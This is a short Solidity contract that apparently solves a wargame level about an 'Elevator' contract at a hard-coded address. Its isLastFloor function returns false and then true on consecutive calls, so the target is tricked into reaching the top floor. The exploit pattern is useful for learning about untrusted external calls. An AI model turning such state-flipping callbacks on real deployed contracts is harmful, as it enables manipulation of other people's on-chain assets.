//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./elevator.sol";

contract elevatorAttack {
    Elevator public target =
        Elevator(0xAC1d328f6b1DB50f53bD5754Dc1756fE209BB1E8);
    bool public check = false;

    function attack() public {
        target.goTo(5);
    }

    function isLastFloor(uint) public returns (bool) {
        if (!check) {
            check = true;
            return false;
        } else {
            check = false;
            return true;
        }
    }
}
